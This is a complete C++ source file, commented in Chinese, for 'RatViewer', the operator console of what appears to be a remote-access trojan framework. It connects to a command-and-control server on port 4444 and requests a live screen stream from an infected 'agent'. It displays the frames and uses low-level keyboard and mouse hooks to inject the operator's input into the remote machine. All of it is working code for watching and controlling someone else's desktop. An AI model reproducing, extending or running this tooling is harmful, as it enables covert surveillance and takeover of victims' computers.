// viewer/main.cpp — 远控查看器（独立 C++ 程序）
//
// 用法：viewer -s <host:port> -a <agent_id> [-fps 25] [-quality 70] [-scale 100]
//
// 职责：
//   1) 以 CONTROL 角色连接 c2server:4444（复用 im_ctl/ctl_client.cpp 的协议栈）
//   2) 由本连接发起屏幕流 0x1002（C2 按"发起请求的那条 ctl 连接"配对转发帧，
//      所以屏幕流必须由 viewer 自己建立，ratctl 只负责拉起本进程）
//   3) Win32 窗口显示 JPEG 帧（WIC 解码 → StretchDIBits）
//   4) 低级钩子采集键鼠 → 坐标换算 → 0x0504 注入远程
//
// 退出：窗口关闭时向 Agent 发 0x1002 control=0；若启动未完成则跳过
//      （此时可用 ratctl 的 stop 命令兜底清理）。
#include "ctl_client.h"
#include "input_hook.h"

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>

#include <algorithm>
#include <atomic>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

namespace {

using ctl::CtlClient;

constexpr wchar_t kWndClass[] = L"RatViewerWnd";
constexpr UINT kMsgFrame = WM_APP + 1;
constexpr UINT_PTR kTimerFlush = 1;
constexpr UINT kFlushMs = 16;  // 输入批量发送周期（约 60Hz）

CtlClient g_client;
std::string g_hostPort = "127.0.0.1:4444";
std::string g_agentId;
int g_fps = 25;
int g_quality = 70;
int g_scale = 100;

HWND g_hwnd = nullptr;
std::atomic<bool> g_streamOn{false};
std::atomic<bool> g_startupDone{false};

std::mutex g_statusMx;
std::string g_status = "connecting...";
std::wstring g_titleShown;

std::mutex g_frameMx;
std::vector<uint8_t> g_frameBgra;
int g_frameW = 0;
int g_frameH = 0;
unsigned long long g_frameCount = 0;

std::wstring to_wide(const std::string& s) {
    if (s.empty())
        return std::wstring();
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    if (n <= 0)
        return std::wstring();
    std::wstring w((size_t)n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
    return w;
}

void set_status(const std::string& s) {
    std::lock_guard<std::mutex> lk(g_statusMx);
    g_status = s;
}

std::string get_status() {
    std::lock_guard<std::mutex> lk(g_statusMx);
    return g_status;
}

// ---- 帧回调（读线程调用）----
void on_frame(uint32_t seq, int w, int h, const uint8_t* jpeg, size_t len) {
    (void)seq;
    (void)w;
    (void)h;
    std::vector<uint8_t> bgra;
    int dw = 0, dh = 0;
    if (!ctl::decode_jpeg_to_bgra(jpeg, len, dw, dh, bgra))
        return;
    {
        std::lock_guard<std::mutex> lk(g_frameMx);
        g_frameBgra.swap(bgra);
        g_frameW = dw;
        g_frameH = dh;
        g_frameCount++;
    }
    if ((g_frameCount % 25) == 1)
        std::printf("[*] frame #%llu (%dx%d, %zu jpeg bytes)\n",
                    g_frameCount, dw, dh, len);
    if (g_hwnd)
        PostMessageW(g_hwnd, kMsgFrame, 0, 0);
}

bool is_self_foreground() {
    HWND fg = GetForegroundWindow();
    if (!fg)
        return false;
    DWORD pid = 0;
    GetWindowThreadProcessId(fg, &pid);
    return pid == GetCurrentProcessId();
}

// 采集 → 坐标换算 → 发送（鼠标仅图像矩形内；键盘仅本程序为前台）
void flush_input() {
    if (!g_streamOn.load()) {
        viewer::clear_events();
        return;
    }
    std::vector<c2::InputEvent> batch = viewer::take_events();
    if (batch.empty())
        return;

    bool foreground = is_self_foreground();
    std::vector<c2::InputEvent> out;
    out.reserve(batch.size());
    for (auto& ev : batch) {
        bool isMouse = (ev.msg >= WM_MOUSEFIRST && ev.msg <= WM_MOUSELAST);
        if (isMouse) {
            int rx = 0, ry = 0;
            if (!viewer::map_to_remote(ev.x, ev.y, rx, ry))
                continue;  // 图像区域外：丢弃（避免误操作远端其他区域）
            ev.x = rx;
            ev.y = ry;
        } else if (!foreground) {
            continue;  // 键盘：仅 viewer 为前台时发送
        }
        out.push_back(ev);
    }
    if (out.empty())
        return;
    std::string err;
    g_client.sendInputEvents(g_agentId, out, err);
}

void update_title() {
    std::string st = get_status();
    if (g_streamOn.load()) {
        char buf[128];
        std::snprintf(buf, sizeof(buf), "streaming (%llu frames)", g_frameCount);
        st = buf;
    }
    std::wstring title = L"RatViewer [" + to_wide(g_agentId.substr(0, 8)) + L"] - " + to_wide(st);
    if (title != g_titleShown && g_hwnd) {
        g_titleShown = title;
        SetWindowTextW(g_hwnd, title.c_str());
    }
}

void paint(HWND hwnd) {
    PAINTSTRUCT ps;
    HDC hdc = BeginPaint(hwnd, &ps);
    RECT rc;
    GetClientRect(hwnd, &rc);
    const int cw = rc.right - rc.left;
    const int ch = rc.bottom - rc.top;

    bool drawn = false;
    {
        std::lock_guard<std::mutex> lk(g_frameMx);
        if (g_frameW > 0 && g_frameH > 0 && !g_frameBgra.empty() && cw > 0 && ch > 0) {
            const double s = (std::min)((double)cw / g_frameW, (double)ch / g_frameH);
            int dw = (int)(g_frameW * s);
            int dh = (int)(g_frameH * s);
            if (dw < 1) dw = 1;
            if (dh < 1) dh = 1;
            const int dx = (cw - dw) / 2;
            const int dy = (ch - dh) / 2;

            viewer::set_frame_size(g_frameW, g_frameH);
            viewer::set_image_rect(dx, dy, dx + dw, dy + dh);

            BITMAPINFO bmi{};
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
            bmi.bmiHeader.biWidth = g_frameW;
            bmi.bmiHeader.biHeight = -g_frameH;  // 负值：自上而下
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 32;
            bmi.bmiHeader.biCompression = BI_RGB;

            SetStretchBltMode(hdc, COLORONCOLOR);
            StretchDIBits(hdc, dx, dy, dw, dh, 0, 0, g_frameW, g_frameH,
                          g_frameBgra.data(), &bmi, DIB_RGB_COLORS, SRCCOPY);
            drawn = true;
        }
    }
    if (!drawn) {
        FillRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(200, 200, 200));
        std::wstring w = to_wide(get_status());
        DrawTextW(hdc, w.c_str(), -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
    }
    EndPaint(hwnd, &ps);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case kMsgFrame:
        InvalidateRect(hwnd, nullptr, FALSE);
        return 0;
    case WM_TIMER:
        if (wp == kTimerFlush) {
            flush_input();
            update_title();
        }
        return 0;
    case WM_ERASEBKGND:
        return 1;
    case WM_PAINT:
        paint(hwnd);
        return 0;
    case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    default:
        break;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

// 启动线程：连接 + 发起屏幕流（不等待回执，避免阻塞/退出时来不及发停止）
void startup_thread() {
    std::string host = g_hostPort;
    std::string portStr = "4444";
    const size_t c = g_hostPort.rfind(':');
    if (c != std::string::npos) {
        host = g_hostPort.substr(0, c);
        portStr = g_hostPort.substr(c + 1);
    }
    const uint16_t port = (uint16_t)std::atoi(portStr.c_str());

    std::string err;
    if (!g_client.connect(host, port, err)) {
        set_status("connect failed: " + err);
        std::printf("[!] connect failed: %s\n", err.c_str());
        g_startupDone.store(true);
        return;
    }
    std::printf("[*] connected to %s:%u\n", host.c_str(), port);
    g_client.setFrameCallback(on_frame);

    set_status("requesting screen stream...");
    if (!g_client.screenStream(g_agentId, 1, (uint8_t)g_fps, (uint8_t)g_quality,
                               (uint8_t)g_scale, err, /*wait=*/false)) {
        set_status("stream request failed: " + err);
        std::printf("[!] stream request failed: %s\n", err.c_str());
        g_startupDone.store(true);
        return;
    }
    g_streamOn.store(true);
    set_status("waiting for frames...");
    std::printf("[*] screen stream requested (fps=%d quality=%d scale=%d%%)\n",
                g_fps, g_quality, g_scale);
    g_startupDone.store(true);
}

void print_usage() {
    std::printf(
        "viewer - 远控查看器\n"
        "用法: viewer -s <host:port> -a <agent_id> [-fps 25] [-quality 70] [-scale 100]\n"
        "  通常由 ratctl 的 screen 命令自动拉起。\n");
}

bool parse_args(int argc, char** argv) {
    for (int i = 1; i < argc; ++i) {
        const std::string a = argv[i];
        auto next = [&](std::string& out) -> bool {
            if (i + 1 >= argc)
                return false;
            out = argv[++i];
            return true;
        };
        std::string v;
        if (a == "-s") {
            if (!next(v)) return false;
            g_hostPort = v;
        } else if (a == "-a") {
            if (!next(v)) return false;
            g_agentId = v;
        } else if (a == "-fps") {
            if (!next(v)) return false;
            g_fps = std::atoi(v.c_str());
        } else if (a == "-quality") {
            if (!next(v)) return false;
            g_quality = std::atoi(v.c_str());
        } else if (a == "-scale") {
            if (!next(v)) return false;
            g_scale = std::atoi(v.c_str());
        } else {
            std::printf("[!] 未知参数: %s\n", a.c_str());
            return false;
        }
    }
    if (g_agentId.size() != 32) {
        std::printf("[!] 需要 -a <agent_id>（32 位 hex）\n");
        return false;
    }
    if (g_fps <= 0 || g_fps > 60) g_fps = 25;
    if (g_quality <= 0 || g_quality > 100) g_quality = 70;
    if (g_scale <= 0 || g_scale > 100) g_scale = 100;
    return true;
}

}  // namespace

int main(int argc, char** argv) {
    if (!parse_args(argc, argv)) {
        print_usage();
        return 2;
    }
    SetProcessDPIAware();  // 钩子坐标与窗口坐标统一为物理像素

    HINSTANCE hInst = GetModuleHandleW(nullptr);
    WNDCLASSEXW wc{};
    wc.cbSize = sizeof(wc);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.hCursor = LoadCursorW(nullptr, (LPCWSTR)IDC_ARROW);
    wc.hbrBackground = nullptr;
    wc.lpszClassName = kWndClass;
    if (!RegisterClassExW(&wc)) {
        std::printf("[!] RegisterClass failed: %lu\n", GetLastError());
        return 1;
    }

    HWND hwnd = CreateWindowExW(0, kWndClass, L"RatViewer", WS_OVERLAPPEDWINDOW,
                                CW_USEDEFAULT, CW_USEDEFAULT, 1280, 800,
                                nullptr, nullptr, hInst, nullptr);
    if (!hwnd) {
        std::printf("[!] CreateWindow failed: %lu\n", GetLastError());
        return 1;
    }
    g_hwnd = hwnd;
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    if (!viewer::install_hooks())
        std::printf("[!] 键鼠钩子安装失败（err=%lu），本机操作不会下发\n", GetLastError());
    SetTimer(hwnd, kTimerFlush, kFlushMs, nullptr);

    std::thread th(startup_thread);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    // ---- 退出清理 ----
    KillTimer(hwnd, kTimerFlush);
    viewer::uninstall_hooks();
    if (g_streamOn.load()) {
        std::string err;
        g_client.screenStream(g_agentId, 0, (uint8_t)g_fps, (uint8_t)g_quality,
                              (uint8_t)g_scale, err, /*wait=*/false);
        std::printf("[*] 已发送屏幕流停止请求\n");
    } else {
        std::printf("[*] 屏幕流未启动，跳过停止请求（可用 ratctl stop 兜底）\n");
    }
    g_streamOn.store(false);
    th.join();
    g_client.disconnect();
    std::printf("[*] viewer exit (frames=%llu)\n", g_frameCount);
    return 0;
}
